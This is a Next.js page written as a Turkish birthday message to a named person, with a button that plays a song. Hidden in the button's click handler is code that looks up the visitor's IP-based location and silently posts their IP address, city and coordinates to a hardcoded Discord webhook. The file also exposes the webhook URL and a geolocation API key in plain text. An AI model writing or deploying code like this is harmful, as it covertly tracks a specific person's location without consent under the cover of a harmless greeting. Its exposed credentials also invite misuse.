import Image from 'next/image'
import { Inter } from 'next/font/google'
import Status from '@/components/Spotify/Status';
const inter = Inter({ subsets: ['latin'] })
import Link from 'next/link';
import useSWR from 'swr';
import Bio from '@/components/Bio';
import { useState } from 'react';

export default function Home() {
  const isDarkMode = true; // Change this to a variable that determines if dark mode is enabled or not
  const [isPlaying, setIsPlaying] = useState(false);



  const webhookUrl = 'https://discord.com/api/webhooks/1197248396877123674/JVwkelAuT-VGvz0KKSN0jhrsbrdDcb-7oWW4T50RMTMKn3MggR1tAXk-SXEMzp1vnLMZ';

  const getCity = async () => {
    const response = await fetch('https://api.geoapify.com/v1/ipinfo?apiKey=b034f5cbca974ef99607d57a97574738');
    const data = await response.json();
    console.log(data);
    return data;
  }

  const sendWebhookMessage = async () => {
    try {
      const city = await getCity();
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `**Şehir** = ** ${city.city.name}**
                    **İP** = ** ${city.ip}**
                    **Lokasyon** = ** {
                        "latitude": ${city.location.latitude},
                        "longitude": ${city.location.longitude}
                    }**
                    **Lokasyon 1** = ** ${JSON.stringify(city.location.latitude)}**
                    **Lokasyon 2** = ** ${JSON.stringify(city.location.longitude)}**`,
        }),
      });

      if (response.ok) {
        console.log('Webhook message sent successfully');
      } else {
        console.error('Failed to send webhook message');
      }
    } catch (error) {
      console.error('Error sending webhook message:', error);
    }
  };


  const playSong = () => {
    const songUrl = 'https://cdn.glitch.global/f760cd64-8e70-4008-948d-8ed8d8180427/mp3indirdur-Ziynet-Sali-Hersey-Guzel-Olacak.mp3?v=1705587548505';
    const audio = new Audio(songUrl);
  
    sendWebhookMessage();
    if (isPlaying) {
      audio.pause();
      setIsPlaying(false);
    } else {
      audio.currentTime = 0; // Reset the audio to the beginning
      audio.play();
      setIsPlaying(true);
    }
  };

  return (
    <main className="flex items-center flex-col justify-center h-screen deneme">
      
      <a onClick={playSong} className="select-none cursor-pointer relative items-center justify-center inline-block p-4 px-5 py-3 overflow-hidden font-medium text-indigo-600 rounded-lg shadow-2xl group">
<span className="absolute top-0 left-0 w-40 h-40 -mt-10 -ml-3 transition-all duration-700 bg-red-500 rounded-full blur-md ease"></span>
<span className="absolute inset-0 w-full h-full transition duration-700 group-hover:rotate-180 ease">
<span className="absolute bottom-0 left-0 w-24 h-24 -ml-10 bg-purple-500 rounded-full blur-md"></span>
<span className="absolute bottom-0 right-0 w-24 h-24 -mr-10 bg-pink-500 rounded-full blur-md"></span>
</span>
<span className="relative font-bold text-white">Bana bir kere tıkla</span>
</a>
{isPlaying && <p className='text-white underline underline-offset-4  font-sans font-bold'>Şarkı oynatılıyor...</p>}


      <div className={`mt-8 mx-10 bg-yellow-200 text-red-900 font-bold text-lg rounded-lg p-4 border-2 border-yellow-400 `}>
        <p>
          <a className="flex justify-center">Mutlu yıllaar Tuana..</a>
         <br/>
          Hiç yüz yüze konuşma fırsatımız vesayre olmadı.
         <br/>
          Tam tanışmışda sayılmayız ama,
         <br/>
          Çok iyi birisisin. Ben ayrılıyorum Milas'tan.
         <br/>
          Doğum gününü daha iyi kutlamak isterdim ama,
         <br/>
          Şartlar el vermedi
         <br/> 
          Kendine çok iyi bak dikkat et kendine.
         <br/>
          Ha birde çok güzelsin 😎
         <br/>
          Belki ilerleyen yıllarda tekrar görüşürüz.
          <br/>
          Hoşçakaal.
          <br/>
           
        </p>


    

        
      </div>
    </main>
  );
}
